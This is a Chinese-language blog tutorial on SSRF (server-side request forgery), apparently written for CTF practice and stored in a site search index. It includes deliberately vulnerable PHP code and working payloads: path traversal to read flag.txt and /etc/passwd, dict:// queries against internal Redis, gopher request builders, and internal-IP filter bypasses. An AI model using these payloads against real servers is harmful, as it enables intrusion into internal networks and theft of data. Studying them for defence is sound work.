<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>初识ssrf</title>
    <link href="/2022/08/13/%E5%88%9D%E8%AF%86ssrf/"/>
    <url>/2022/08/13/%E5%88%9D%E8%AF%86ssrf/</url>
    
    <content type="html"><![CDATA[<h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><h2 id="什么是ssrf"><a href="#什么是ssrf" class="headerlink" title="什么是ssrf"></a>什么是ssrf</h2><p>SSRF（Server-Side Request Forgery:服务器端请求伪造）是一种由攻击者构造形成并由服务端发起恶意请求的一个安全漏洞.正是因为恶意请求由服务端发起，而服务端能够请求到与自身相连而与外网隔绝的内部网络系统，所以一般情况下，SSRF的攻击目标是攻击者无法直接访问的内网系统。</p><p>SSRF漏洞的形成大多是由于服务端提供了从其他服务器应用获取数据的功能而没有对目标地址做过滤和限制。 例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等，利用的就是服务端请求伪造，SSRF漏洞可以利用存在缺陷的WEB应用作为代理攻击远程和本地的服务器。</p><p>如下图所示，服务器Ubuntu为WEB服务器，可被攻击者访问，内网中的其他服务器无法被攻击者直接访问。假设服务器Ubuntu中的某个WEB应用存在SSRF漏洞，那我们就可以操作这个WEB服务器去读取本地的文件、探测内网主机存活、探测内网主机端口等，如果借助相关网络协议，我们还可以攻击内网中的Redis、MySql、FastCGI等应用，WEB服务器在整个攻击过程中被作为中间人进行利用。<img src="https://image.3001.net/images/20210114/1610597995_5fffc66bd4875385a330e.png!small" alt="image-20210112220229389"></p><h2 id="漏洞相关函数和类"><a href="#漏洞相关函数和类" class="headerlink" title="漏洞相关函数和类"></a>漏洞相关函数和类</h2><ul><li>file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。</li><li>readfile()：输出一个文件的内容。</li><li>fsockopen()：打开一个网络连接或者一个Unix 套接字连接。</li><li>curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。</li><li>fopen()：打开一个文件文件或者 URL。</li></ul><p>上述函数函数使用不当会造成SSRF漏洞。 此外，PHP原生类SoapClient在触发反序列化时可导致SSRF。</p><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a><strong>file_get_contents()</strong></h3><p>file_get_contents() 函数将整个文件或一个url所指向的文件读入一个字符串</p><p>没有任何过滤时，构造类似<code>ssrf.php?url=../../../../../etc/passwd</code>的paylaod即可读取服务器本地的任意文件</p><p>测试代码：&#x2F;&#x2F;假设已知flag.txt在根目录下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]; <br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">filter_var</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>],FILTER_VALIDATE_URL)) &#123; <span class="hljs-comment">//检测url是否正确</span><br>    <span class="hljs-variable">$r</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);  <br>    <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$r</span>); <br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/great\.ctf$/&#x27;</span>,<span class="hljs-variable">$r</span>[<span class="hljs-string">&#x27;host&#x27;</span>]))&#123; <span class="hljs-comment">//要匹配到&#x27;great.ctf&#x27;</span><br>        <span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]); <br>        <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$a</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>    &#125;  <br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error:Invalid URL; WhereIsSourceCode &quot;</span>;&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><a href="https://www.runoob.com/php/func-filter-var.html">filter_var()函数是通过指定的过滤器过滤一个变量。</a><br><a href="https://www.runoob.com/php/filter-validate-url.html">FILTER_VALIDATE_URL过滤器</a>  </p><p><a href="https://www.php.net/parse_url">parse_url是解析 URL，返回其组成部分</a></p><p>关键：利用file_get_contents读取文件</p><p>前置知识：php源码中，在向目标请求时先会判断使用的协议。如果协议无法识别，就会认为它是个目录。<br>我们就可以使用任意的非法协议如’0’,php如果识别不了就会当成一个目录,再此基础上可以在进行目录穿越，穿越到根目录读取flag.txt</p><p>payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">0</span>:<span class="hljs-regexp">//g</span>reat.ctf<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>flag.txt<br></code></pre></td></tr></table></figure><p>file_get_contents使用不存在的协议名导致目录穿越，实现SSRF</p><p>readfile()函数与其类似</p><h3 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a><strong>fsockopen()</strong></h3><p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code>用于打开一个网络连接或者一个Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。</p><p>fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false。</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$host</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$host</span>, <span class="hljs-number">80</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$fp</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (<span class="hljs-subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET / HTTP/1.1\r\n&quot;</span>;<br>    <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: <span class="hljs-subst">$host</span>\r\n&quot;</span>;<br>    <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>;<br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>);<br>    <span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-number">128</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>构造<code>ssrf.php?url=www.baidu.com</code>即可成功触发ssrf并返回百度主页</p><p>无法读取本地文件，建立的是tcp连接</p><h3 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a><strong>curl_exec()</strong></h3><p>curl_init(url)函数初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// ssrf.php</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br><span class="hljs-variable">$link</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$curlobj</span> = <span class="hljs-title function_ invoke__">curl_init</span>(); <span class="hljs-comment">// 创建新的 cURL 资源</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_POST, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>,CURLOPT_URL,<span class="hljs-variable">$link</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>); <span class="hljs-comment">// 设置 URL 和相应的选项</span><br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curlobj</span>); <span class="hljs-comment">// 抓取 URL 并把它传递给浏览器</span><br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curlobj</span>); <span class="hljs-comment">// 关闭 cURL 资源，并且释放系统资源</span><br> <br><span class="hljs-comment">// $filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;;</span><br><span class="hljs-comment">// file_put_contents($filename, $result); </span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>构造<code>ssrf.php?url=www.baidu.com</code>即可成功触发ssrf并返回百度主页</p><h3 id="php-SoapClient类"><a href="#php-SoapClient类" class="headerlink" title="php SoapClient类"></a><strong><a href="https://www.php.net/manual/en/class.soapclient.php">php SoapClient类</a></strong></h3><p>SOAP是简单对象访问协议，简单对象访问协议（SOAP）是一种轻量的、简单的、基于 XML 的协议，它被设计成在 WEB 上交换结构化的和固化的信息。PHP 的 SoapClient 就是可以基于SOAP协议可专门用来访问 WEB 服务的 PHP 客户端。</p><p>SoapClient是一个php的内置类，当其进行反序列化时，如果调用了一个未知的方法触发了该类中的<code>__call</code>方法，那么<code>__call</code>便方法可以发送HTTP和HTTPS请求。</p><p><img src="/image/7.png" alt="soapclient类的可调用的方法"></p><p><a href="https://www.php.net/manual/en/soapclient.call.php">SoapClient::__call</a> — Calls a SOAP function (deprecated)</p><p>该类的构造函数如下：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">public</span> SoapClient <span class="hljs-type">:: SoapClient</span>(mixed $wsdl <span class="hljs-meta">[</span>，<span class="hljs-built_in">array</span> $options <span class="hljs-meta">]</span>)<br></code></pre></td></tr></table></figure><ul><li>第一个参数是用来指明是否是wsdl模式（Web服务描述语言，Web Services Description Language,是为描述Web服务发布的XML格式)</li><li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下(一般设置第一个参数为null），则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而 uri 是SOAP服务的目标命名空间。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://47.xxx.xxx.72:2333&#x27;</span>, <span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://47.xxx.xxx.72:2333/aaa&#x27;</span>));<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();    <span class="hljs-comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>location写vps</p><p>监听2333端口，访问ssrf.php，即可在47.xxx.xxx.72上得到访问的数据（仅限http&#x2F;https协议）</p><p>但是如果这里的http头部还存在<a href="https://www.freebuf.com/column/202762.html#:~:text=CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%8C%E6%98%AF%E5%9B%A0%E4%B8%BAWeb%E5%BA%94%E7%94%A8%E6%B2%A1%E6%9C%89%E5%AF%B9%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E5%81%9A%E4%B8%A5%E6%A0%BC%E9%AA%8C%E8%AF%81%EF%BC%8C%E5%AF%BC%E8%87%B4%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E4%BB%A5%E8%BE%93%E5%85%A5%E4%B8%80%E4%BA%9B%E6%81%B6%E6%84%8F%E5%AD%97%E7%AC%A6%E3%80%82%20%E6%94%BB%E5%87%BB%E8%80%85%E4%B8%80%E6%97%A6%E5%90%91%E8%AF%B7%E6%B1%82%E8%A1%8C%E6%88%96%E9%A6%96%E9%83%A8%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AE%B5%E6%B3%A8%E5%85%A5%E6%81%B6%E6%84%8F%E7%9A%84CRLF%EF%BC%8C%E5%B0%B1%E8%83%BD%E6%B3%A8%E5%85%A5%E4%B8%80%E4%BA%9B%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5%E6%88%96%E6%8A%A5%E6%96%87%E4%B8%BB%E4%BD%93%EF%BC%8C%E5%B9%B6%E5%9C%A8%E5%93%8D%E5%BA%94%E4%B8%AD%E8%BE%93%E5%87%BA%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8F%88%E7%A7%B0%E4%B8%BAHTTP%E5%93%8D%E5%BA%94%E6%8B%86%E5%88%86%E6%BC%8F%E6%B4%9E%EF%BC%88HTTP,Response%20Splitting%EF%BC%89%E3%80%82">crlf漏洞</a>，那么我们就可以进行ssrf+crlf，注入或修改一些http请求，通常和反序列化一起考，详情：<a href="https://www.anquanke.com/post/id/202025">《SoapClient+crlf组合拳进行SSRF》</a></p><p><a href="https://www.anquanke.com/post/id/153065#h2-5">https://www.anquanke.com/post/id/153065#h2-5</a></p><h2 id="SSRF漏洞利用的相关协议"><a href="#SSRF漏洞利用的相关协议" class="headerlink" title="SSRF漏洞利用的相关协议"></a>SSRF漏洞利用的相关协议</h2><p>SSRF漏洞的利用所涉及的协议有：</p><ul><li><p>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</p></li><li><p>file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容</p></li><li><p>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</p></li><li><p>http&#x2F;s协议：探测内网主机存活 </p><p>​</p></li></ul><h3 id="http-x2F-s协议"><a href="#http-x2F-s协议" class="headerlink" title="http&#x2F;s协议"></a><strong>http&#x2F;s协议</strong></h3><p>域网IP地址范围分三类，以下IP段为内网IP段：</p><ul><li><p>C类：192.168.0.0 - 192.168.255.255</p></li><li><p>B类：172.16.0.0 - 172.31.255.255</p></li><li><p>A类：10.0.0.0 - 10.255.255.255</p><p>借助burpsuite的Intruder模块队xxx.xxx.xxx.<code>$a$</code>进行爆破</p><p>也可以对端口进行爆破</p><p>或者利用python脚本来探测（暂未研究</p><p>测试</p></li></ul><h3 id="dict协议（扫描内网端口）"><a href="#dict协议（扫描内网端口）" class="headerlink" title="dict协议（扫描内网端口）"></a><strong>dict协议</strong>（扫描内网端口）</h3><p><strong>字典服务器器协议,dict是基于查询响应的TCP协议</strong></p><p>用dict协议，<code>dict://127.0.0.1:6379/info</code>可获取本地redis服务配置信息。</p><p>还可以用<code>dict://127.0.0.1:6379/KEYS *</code>获取redis存储的内容</p><p>一些协议的默认端口</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">dict:</span><span class="hljs-comment">//127.0.0.1:6379/info   // redis</span><br><span class="hljs-symbol">dict:</span><span class="hljs-comment">//127.0.0.1:80/info     // http</span><br><span class="hljs-symbol">dict:</span><span class="hljs-comment">//127.0.0.1:22/info   // ssh</span><br><span class="hljs-symbol">dict:</span><span class="hljs-comment">//127.0.0.1:3306/info  //mysql</span><br><span class="hljs-symbol">dict:</span><span class="hljs-comment">//127.0.0.1:6379/KEYS *  //获取redis存储的内容 </span><br></code></pre></td></tr></table></figure><p>测试</p><h3 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a><strong>file协议</strong></h3><p>(读取内网文件)</p><p>用file协议代替http协议或者https协议（如果过滤了）。在测试点输入<code>file:///etc/passwd</code>我们可以得到用户文件，我们也可以通过这样的方式获得其他文件。</p><p>测试</p><h3 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a><strong>gopher协议</strong></h3><p>Gopher协议支持发出GET、POST请求，我们可以先截获GET请求包和POST请求包，再构造成符合Gopher协议请求的payload进行SSRF利用，甚至可以用它来攻击内网中的Redis、MySql、FastCGI等应用，这无疑大大扩展了我们的SSRF攻击面。</p><p><strong>（1）Gopher协议格式</strong></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">URL:</span> <span class="hljs-symbol">gopher:</span>//&lt;host&gt;<span class="hljs-symbol">:&lt;port&gt;/&lt;gopher-path&gt;_</span>后接<span class="hljs-title class_">TCP</span>数据流<br><br><span class="hljs-comment"># 注意不要忘记后面那个下划线&quot;_&quot;，下划线&quot;_&quot;后面才开始接TCP数据流，如果不加这个&quot;_&quot;，那么服务端收到的消息将不是完整的，该字符可随意写。</span><br></code></pre></td></tr></table></figure><ul><li>gopher的默认端口是70</li><li>如果发起POST请求，回车换行需要使用<code>%0d%0a</code>来代替<code>%0a</code>，如果多个参数，参数之间的&amp;也需要进行URL编码</li></ul><blockquote><p>那么如何利用Gopher发送HTTP的请求呢？例如GET请求。我们直接发送一个原始的HTTP包不就行了吗。在gopher协议中发送HTTP的数据，需要以下三步：</p><ol><li>抓取或构造HTTP数据包</li><li>URL编码、将回车换行符<code>%0a</code>替换为<code>%0d%0a</code>（这是请求头里每行结束的标志，通常和crlf漏洞相关）</li><li>发送符合gopher协议格式的请求</li></ol></blockquote><p><strong>（2）利用Gopher协议发送HTTP GET请求</strong></p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// echo.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;whoami&quot;</span>].<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>接下来我们构造payload。一个典型的GET型的HTTP包类似如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/echo.php?whoami=Bunny</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>47.xxx.xxx.72<br></code></pre></td></tr></table></figure><p>然后利用以下脚本进行一步生成符合Gopher协议格式的payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>payload =\<br><span class="hljs-string">&quot;&quot;&quot;GET /echo.php?whoami=Bunny HTTP/1.1</span><br><span class="hljs-string">Host: 47.xxx.xxx.72</span><br><span class="hljs-string">&quot;&quot;&quot;</span>  <br><span class="hljs-comment"># 注意后面一定要有回车，回车结尾表示http请求结束</span><br>tmp = urllib.parse.quote(payload)<br>new = tmp.replace(<span class="hljs-string">&#x27;%0A&#x27;</span>,<span class="hljs-string">&#x27;%0D%0A&#x27;</span>)<br>result = <span class="hljs-string">&#x27;gopher://47.xxx.xxx.72:80/&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+new<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><blockquote><p><strong>注意这几个问题：</strong></p><ol><li>问号（?）需要转码为URL编码，也就是%3f</li><li>回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a</li><li>在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</li></ol></blockquote><p><strong>（3）利用Gopher协议发送HTTP POST请求</strong></p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// echo.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;whoami&quot;</span>].<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>接下来我们构造payload。一个典型的POST型的HTTP包类似如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/echo.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>47.xxx.xxx.72<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>12<br><br><span class="language-abnf"><span class="hljs-attribute">whoami</span><span class="hljs-operator">=</span>Bunny</span><br></code></pre></td></tr></table></figure><p><strong>注意：上面那四个HTTP头是POST请求必须的，即POST、Host、Content-Type和Content-Length。如果少了会报错的，而GET则不用。并且，特别要注意Content-Length应为字符串“whoami&#x3D;Bunny”的长度。</strong></p><p>最后用脚本我们将上面的POST数据包进行URL编码并改为gopher协议</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>payload =\<br><span class="hljs-string">&quot;&quot;&quot;POST /echo.php HTTP/1.1</span><br><span class="hljs-string">Host: 47.xxx.xxx.72</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Content-Length: 12</span><br><span class="hljs-string"></span><br><span class="hljs-string">whoami=Bunny</span><br><span class="hljs-string">&quot;&quot;&quot;</span>  <br><span class="hljs-comment"># 注意后面一定要有回车，回车结尾表示http请求结束</span><br>tmp = urllib.parse.quote(payload)<br>new = tmp.replace(<span class="hljs-string">&#x27;%0A&#x27;</span>,<span class="hljs-string">&#x27;%0D%0A&#x27;</span>)<br>result = <span class="hljs-string">&#x27;gopher://47.xxx.xxx.72:80/&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+new<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p>例题 <strong>[2020 科来杯初赛]Web1</strong></p><h2 id="一些姿势"><a href="#一些姿势" class="headerlink" title="一些姿势"></a>一些姿势</h2><h3 id="利用302跳转绕过内网IP"><a href="#利用302跳转绕过内网IP" class="headerlink" title="利用302跳转绕过内网IP"></a>利用302跳转绕过内网IP</h3><p>（1）短地址跳转绕过，这里也给出一个网址</p><p><a href="https://urlify.cn/">https://urlify.cn/</a></p><p> (2)网络上存在一个很神奇的服务，网址为 <a href="http://xip.io/">http://xip.io</a>，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，举个例子：</p><p>当我们访问：<a href="http://127.0.0.1.xip.io/flag.php">http://127.0.0.1.xip.io/flag.php</a>时，实际访问的是<a href="http://127.0.0.1/1.php">http://127.0.0.1/1.php</a>。像这种网址还有<a href="http://nip.io/">http://nip.io</a>，<a href="http://sslip.io/">http://sslip.io</a>。（不知为啥这里测试不成功）</p><p>（3）奇淫巧技：将域名A类指向127.0.0.1</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">http(s):<span class="hljs-regexp">//</span>sudo.cc/指向<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><br>url=http:<span class="hljs-regexp">//</span>sudo.cc<span class="hljs-regexp">/   /</span><span class="hljs-regexp">/测试成功</span><br></code></pre></td></tr></table></figure><h3 id="进制的转换绕过内网IP"><a href="#进制的转换绕过内网IP" class="headerlink" title="进制的转换绕过内网IP"></a>进制的转换绕过内网IP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ip</span> = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-variable">$ip</span>);<br><span class="hljs-variable">$r</span> = (<span class="hljs-variable">$ip</span>[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">24</span>) | (<span class="hljs-variable">$ip</span>[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">16</span>) | (<span class="hljs-variable">$ip</span>[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">8</span>) | <span class="hljs-variable">$ip</span>[<span class="hljs-number">3</span>] ;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$r</span> &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-variable">$r</span> += <span class="hljs-number">4294967296</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;十进制:&quot;</span>;     <span class="hljs-comment">// 2130706433</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$r</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;八进制:&quot;</span>;     <span class="hljs-comment">// 0177.0.0.1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">decoct</span>(<span class="hljs-variable">$r</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;十六进制:&quot;</span>;   <span class="hljs-comment">// 0x7f.0.0.1</span><br><span class="hljs-keyword">echo</span> <span 